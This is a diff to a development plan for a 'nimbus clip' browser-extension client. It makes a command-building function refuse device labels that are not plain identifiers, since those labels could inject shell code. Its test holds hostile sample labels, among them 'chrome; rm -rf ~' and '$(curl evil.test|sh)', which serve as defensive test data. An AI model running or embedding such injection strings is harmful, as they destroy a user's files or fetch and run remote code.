@@ -14,6 +14,13 @@
 
 - TypeScript **strict**; **no `any`** — cross-boundary data is `unknown`, narrowed by a guard.
 - **No `console.*` in `src/`.** Tests and `scripts/` may log.
+- **DOM tests opt into jsdom with a first-line `// @vitest-environment jsdom`** — a
+  line comment, which is this repo's convention across all nine DOM test files, not
+  the `/** … */` block form. `panel-view.test.ts` and `panel-in-page.test.ts`
+  already carry it: **preserve it.** Rewriting a test file wholesale and dropping
+  that line makes every DOM test fail on a missing `document`, which reads as a
+  broken implementation rather than a missing directive. The new
+  `scope-command.test.ts` is pure string building and must **not** have it.
 - **Never log the bearer token or the pairing code.**
 - **Loopback only** — no network destination beyond `127.0.0.1` / `localhost`.
 - **Every gateway-provided string renders via `textContent`**, never `innerHTML`.
@@ -157,7 +164,7 @@ Retro-fixes a defect in shipped code: the `needs-scope` message renders a litera
     readonly required: string;
     readonly granted: readonly string[];
   }
-  export function scopeCommand(gap: ScopeGap): string;
+  export function scopeCommand(gap: ScopeGap): string | null;   // null = unsafe label
   ```
   `HeaderState`'s `needs-scope` arm gains `readonly scopeGap: ScopeGap | null`.
 
@@ -195,10 +202,33 @@ describe("scopeCommand", () => {
     );
   });
 
-  it("quotes a label containing a space so the command still parses", () => {
-    expect(scopeCommand({ label: "my laptop", required: "fetch", granted: ["clip"] })).toBe(
-      'nimbus clip scopes "my laptop" --set clip,fetch',
-    );
+  // SECURITY. The label is gateway-supplied (it comes back from pair/confirm) and
+  // the gateway does NOT constrain its characters — pairing-window.ts takes
+  // `label: string` unvalidated. We render a command the user is invited to paste
+  // into a shell, so anything that is not a plain identifier gets NO command at
+  // all. Quoting is not a fix: in POSIX shells `$(...)` and backticks execute
+  // inside double quotes, and correct escaping across bash/pwsh/cmd is not
+  // achievable from here.
+  it("returns null for a label that is not a plain identifier", () => {
+    for (const label of [
+      "my laptop",
+      "chrome; rm -rf ~",
+      "$(curl evil.test|sh)",
+      "`id`",
+      "a\nb",
+      "",
+      "x".repeat(65),
+    ]) {
+      expect(scopeCommand({ label, required: "fetch", granted: ["clip"] })).toBeNull();
+    }
+  });
+
+  it("accepts the identifier characters a label legitimately uses", () => {
+    for (const label of ["chrome", "work-laptop", "asaf.dev", "box_2"]) {
+      expect(scopeCommand({ label, required: "fetch", granted: ["clip"] })).toBe(
+        `nimbus clip scopes ${label} --set clip,fetch`,
+      );
+    }
   });
 });
 ```
@@ -228,15 +258,41 @@ import type { ScopeGap } from "./types.ts";
  * 2. A literal `<label>` does not paste. The gateway's 403 carries `granted`, and
  *    the pairing label is stored client-side, so the real values are available.
  */
-export function scopeCommand(gap: ScopeGap): string {
+/**
+ * A device label we are willing to put into a command the user will paste into a
+ * shell. Deliberately strict.
+ *
+ * The label is GATEWAY-SUPPLIED — it comes back from `pair/confirm` — and the
+ * gateway does not constrain it (`pairingWindow.open(label: string, …)` takes any
+ * string). Quoting is not a defence: in POSIX shells `$(...)` and backticks
+ * execute inside double quotes, and there is no escaping that is correct across
+ * bash, pwsh and cmd at once. So anything that is not a plain identifier gets no
+ * command rendered at all.
+ */
+const SAFE_LABEL = /^[A-Za-z0-9._-]{1,64}$/;
+
+/**
+ * Returns null when the label cannot be safely embedded. The caller then renders
+ * generic guidance ("run `nimbus clip status` to find your device") rather than a
+ * command — refusing to print one is strictly better than printing one that could
+ * carry an injection into the user's own shell.
+ */
+export function scopeCommand(gap: ScopeGap): string | null {
+  if (!SAFE_LABEL.test(gap.label)) {
+    return null;
+  }
   const scopes = gap.granted.includes(gap.required)
     ? [...gap.granted]
     : [...gap.granted, gap.required];
-  // A label is user-supplied at pairing time and may contain spaces.
-  const label = gap.label.includes(" ") ? `"${gap.label}"` : gap.label;
-  return `nimbus clip scopes ${label} --set ${scopes.join(",")}`;
+  return `nimbus clip scopes ${gap.label} --set ${scopes.join(",")}`;
 }
 ```
+
+**Why validate instead of escape.** This is the one string in the product we
+actively invite the user to run in a shell. A hostile gateway implies local
+compromise already, so this is defence in depth rather than the primary boundary —
+but the cost of getting it right is one regex, and the cost of getting it wrong is
+handing someone a command that does something other than what it reads.
 
 Add to `src/shared/types.ts`:
 
@@ -355,13 +411,17 @@ and its render:
 ```ts
   if (state.kind === "needs-scope") {
     box.append(line(doc, "nimbus-related__status", "This pairing can't resolve pages yet."));
+    // Null when the 403 carried no detail, OR when the device label is not safe to
+    // put in a shell command. Both fall back to guidance that names the tool
+    // without pretending to know the exact invocation.
+    const cmd = state.scopeGap === null ? null : scopeCommand(state.scopeGap);
     box.append(
       line(
         doc,
         "nimbus-related__status",
-        state.scopeGap === null
-          ? "Grant it on the gateway with: nimbus clip scopes"
-          : `Grant it on the gateway: ${scopeCommand(state.scopeGap)}`,
+        cmd === null
+          ? "Grant it on the gateway: run nimbus clip status to find this device, then nimbus clip scopes."
+          : `Grant it on the gateway: ${cmd}`,
       ),
     );
     return box;
